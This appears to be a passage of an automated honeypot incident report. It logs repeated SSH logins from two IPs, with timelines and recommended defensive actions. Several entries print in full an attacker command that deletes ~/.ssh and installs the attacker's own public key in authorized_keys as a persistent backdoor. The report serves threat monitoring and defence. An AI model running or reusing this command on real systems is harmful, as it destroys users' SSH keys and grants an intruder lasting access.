| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:26:06` | `cowrie.session.connect` |
| `2026-05-15 05:26:06` | `cowrie.client.version` |
| `2026-05-15 05:26:06` | `cowrie.client.kex` |
| `2026-05-15 05:26:06` | `cowrie.login.success` |
| `2026-05-15 05:26:07` | `cowrie.session.params` |
| `2026-05-15 05:26:07` | `cowrie.command.input` |
| `2026-05-15 05:26:07` | `cowrie.command.failed` |
| `2026-05-15 05:26:07` | `cowrie.log.closed` |
| `2026-05-15 05:26:07` | `cowrie.session.params` |
| `2026-05-15 05:26:07` | `cowrie.command.input` |
| `2026-05-15 05:26:07` | `cowrie.session.file_download` |
| `2026-05-15 05:26:07` | `cowrie.log.closed` |
| `2026-05-15 05:26:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60e6ae14c0f7

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:26 |
| **Last Seen** | 2026-05-15 05:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:26:09` | `cowrie.session.connect` |
| `2026-05-15 05:26:09` | `cowrie.client.version` |
| `2026-05-15 05:26:09` | `cowrie.client.kex` |
| `2026-05-15 05:26:10` | `cowrie.login.success` |
| `2026-05-15 05:26:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7bb0c162a18

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:26 |
| **Last Seen** | 2026-05-15 05:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:26:51` | `cowrie.session.connect` |
| `2026-05-15 05:26:51` | `cowrie.client.version` |
| `2026-05-15 05:26:51` | `cowrie.client.kex` |
| `2026-05-15 05:26:52` | `cowrie.login.success` |
| `2026-05-15 05:26:52` | `cowrie.session.params` |
| `2026-05-15 05:26:52` | `cowrie.command.input` |
| `2026-05-15 05:26:52` | `cowrie.command.failed` |
| `2026-05-15 05:26:52` | `cowrie.log.closed` |
| `2026-05-15 05:26:53` | `cowrie.session.params` |
| `2026-05-15 05:26:53` | `cowrie.command.input` |
| `2026-05-15 05:26:53` | `cowrie.session.file_download` |
| `2026-05-15 05:26:53` | `cowrie.log.closed` |
| `2026-05-15 05:26:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f3f0da4db26

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:26 |
| **Last Seen** | 2026-05-15 05:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:26:55` | `cowrie.session.connect` |
| `2026-05-15 05:26:55` | `cowrie.client.version` |
| `2026-05-15 05:26:55` | `cowrie.client.kex` |
| `2026-05-15 05:26:56` | `cowrie.login.success` |
| `2026-05-15 05:26:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7f16e654f0a

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:29 |
| **Last Seen** | 2026-05-15 05:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:29:11` | `cowrie.session.connect` |
| `2026-05-15 05:29:11` | `cowrie.client.version` |
| `2026-05-15 05:29:11` | `cowrie.client.kex` |
| `2026-05-15 05:29:12` | `cowrie.login.success` |
| `2026-05-15 05:29:12` | `cowrie.session.params` |
| `2026-05-15 05:29:12` | `cowrie.command.input` |
| `2026-05-15 05:29:12` | `cowrie.command.failed` |
| `2026-05-15 05:29:12` | `cowrie.log.closed` |
| `2026-05-15 05:29:13` | `cowrie.session.params` |
| `2026-05-15 05:29:13` | `cowrie.command.input` |
| `2026-05-15 05:29:13` | `cowrie.session.file_download` |
| `2026-05-15 05:29:13` | `cowrie.log.closed` |
| `2026-05-15 05:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05ccb12fa4b8

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:29 |
| **Last Seen** | 2026-05-15 05:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:29:15` | `cowrie.session.connect` |
| `2026-05-15 05:29:15` | `cowrie.client.version` |
| `2026-05-15 05:29:15` | `cowrie.client.kex` |
| `2026-05-15 05:29:16` | `cowrie.login.success` |
| `2026-05-15 05:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f537020c11ba

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:30 |
| **Last Seen** | 2026-05-15 05:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:30:47` | `cowrie.session.connect` |
| `2026-05-15 05:30:47` | `cowrie.client.version` |
| `2026-05-15 05:30:47` | `cowrie.client.kex` |
| `2026-05-15 05:30:47` | `cowrie.login.success` |
| `2026-05-15 05:30:47` | `cowrie.session.params` |
| `2026-05-15 05:30:47` | `cowrie.command.input` |
| `2026-05-15 05:30:47` | `cowrie.command.failed` |
| `2026-05-15 05:30:48` | `cowrie.log.closed` |
| `2026-05-15 05:30:48` | `cowrie.session.params` |
| `2026-05-15 05:30:48` | `cowrie.command.input` |
| `2026-05-15 05:30:48` | `cowrie.session.file_download` |
| `2026-05-15 05:30:48` | `cowrie.log.closed` |
| `2026-05-15 05:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85bfab0cd36f

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:30 |
| **Last Seen** | 2026-05-15 05:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:30:50` | `cowrie.session.connect` |
| `2026-05-15 05:30:50` | `cowrie.client.version` |
| `2026-05-15 05:30:50` | `cowrie.client.kex` |
| `2026-05-15 05:30:51` | `cowrie.login.success` |
| `2026-05-15 05:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2ef06669da2

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:31 |
| **Last Seen** | 2026-05-15 05:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:31:38` | `cowrie.session.connect` |
| `2026-05-15 05:31:38` | `cowrie.client.version` |
| `2026-05-15 05:31:38` | `cowrie.client.kex` |
| `2026-05-15 05:31:38` | `cowrie.login.success` |
| `2026-05-15 05:31:39` | `cowrie.session.params` |
| `2026-05-15 05:31:39` | `cowrie.command.input` |
| `2026-05-15 05:31:39` | `cowrie.command.failed` |
| `2026-05-15 05:31:39` | `cowrie.log.closed` |
| `2026-05-15 05:31:39` | `cowrie.session.params` |
| `2026-05-15 05:31:39` | `cowrie.command.input` |
| `2026-05-15 05:31:40` | `cowrie.session.file_download` |
| `2026-05-15 05:31:40` | `cowrie.log.closed` |
| `2026-05-15 05:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d92f37265d1

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:31 |
| **Last Seen** | 2026-05-15 05:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:31:43` | `cowrie.session.connect` |
| `2026-05-15 05:31:43` | `cowrie.client.version` |
| `2026-05-15 05:31:43` | `cowrie.client.kex` |
| `2026-05-15 05:31:44` | `cowrie.login.success` |
| `2026-05-15 05:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e2df46b9546

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:32 |
| **Last Seen** | 2026-05-15 05:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:32:16` | `cowrie.session.connect` |
| `2026-05-15 05:32:16` | `cowrie.client.version` |
| `2026-05-15 05:32:16` | `cowrie.client.kex` |
| `2026-05-15 05:32:17` | `cowrie.login.success` |
| `2026-05-15 05:32:17` | `cowrie.session.params` |
| `2026-05-15 05:32:17` | `cowrie.command.input` |
| `2026-05-15 05:32:17` | `cowrie.command.failed` |
| `2026-05-15 05:32:17` | `cowrie.log.closed` |
| `2026-05-15 05:32:18` | `cowrie.session.params` |
| `2026-05-15 05:32:18` | `cowrie.command.input` |
| `2026-05-15 05:32:18` | `cowrie.session.file_download` |
| `2026-05-15 05:32:18` | `cowrie.log.closed` |
| `2026-05-15 05:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30b527b05ecc

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:32 |
| **Last Seen** | 2026-05-15 05:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:32:20` | `cowrie.session.connect` |
| `2026-05-15 05:32:20` | `cowrie.client.version` |
| `2026-05-15 05:32:20` | `cowrie.client.kex` |
| `2026-05-15 05:32:20` | `cowrie.login.success` |
| `2026-05-15 05:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-250ba25a3ccd

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:32 |
| **Last Seen** | 2026-05-15 05:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:32:50` | `cowrie.session.connect` |
| `2026-05-15 05:32:50` | `cowrie.client.version` |
| `2026-05-15 05:32:51` | `cowrie.client.kex` |
| `2026-05-15 05:32:52` | `cowrie.login.success` |
| `2026-05-15 05:32:52` | `cowrie.session.params` |
| `2026-05-15 05:32:52` | `cowrie.command.input` |
| `2026-05-15 05:32:52` | `cowrie.command.failed` |
| `2026-05-15 05:32:52` | `cowrie.log.closed` |
| `2026-05-15 05:32:53` | `cowrie.session.params` |
| `2026-05-15 05:32:53` | `cowrie.command.input` |
| `2026-05-15 05:32:53` | `cowrie.session.file_download` |
| `2026-05-15 05:32:53` | `cowrie.log.closed` |
| `2026-05-15 05:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41a03ab04bb4

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:32 |
| **Last Seen** | 2026-05-15 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:32:56` | `cowrie.session.connect` |
| `2026-05-15 05:32:56` | `cowrie.client.version` |
| `2026-05-15 05:32:56` | `cowrie.client.kex` |
| `2026-05-15 05:32:57` | `cowrie.login.success` |
| `2026-05-15 05:32:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4312c81a9fdd

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:33 |
| **Last Seen** | 2026-05-15 05:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:33:45` | `cowrie.session.connect` |
| `2026-05-15 05:33:45` | `cowrie.client.version` |
| `2026-05-15 05:33:45` | `cowrie.client.kex` |
| `2026-05-15 05:33:46` | `cowrie.login.success` |
| `2026-05-15 05:33:46` | `cowrie.session.params` |
| `2026-05-15 05:33:46` | `cowrie.command.input` |
| `2026-05-15 05:33:46` | `cowrie.command.failed` |
| `2026-05-15 05:33:46` | `cowrie.log.closed` |
| `2026-05-15 05:33:47` | `cowrie.session.params` |
| `2026-05-15 05:33:47` | `cowrie.command.input` |
| `2026-05-15 05:33:47` | `cowrie.session.file_download` |
| `2026-05-15 05:33:47` | `cowrie.log.closed` |
| `2026-05-15 05:33:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d83cf11e0f1d

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:33 |
| **Last Seen** | 2026-05-15 05:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:33:49` | `cowrie.session.connect` |
| `2026-05-15 05:33:49` | `cowrie.client.version` |
| `2026-05-15 05:33:49` | `cowrie.client.kex` |
| `2026-05-15 05:33:49` | `cowrie.login.success` |
| `2026-05-15 05:33:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0be9ccccb176

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:34 |
| **Last Seen** | 2026-05-15 05:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:34:01` | `cowrie.session.connect` |
| `2026-05-15 05:34:01` | `cowrie.client.version` |
| `2026-05-15 05:34:01` | `cowrie.client.kex` |
| `2026-05-15 05:34:02` | `cowrie.login.success` |
| `2026-05-15 05:34:02` | `cowrie.session.params` |
| `2026-05-15 05:34:02` | `cowrie.command.input` |
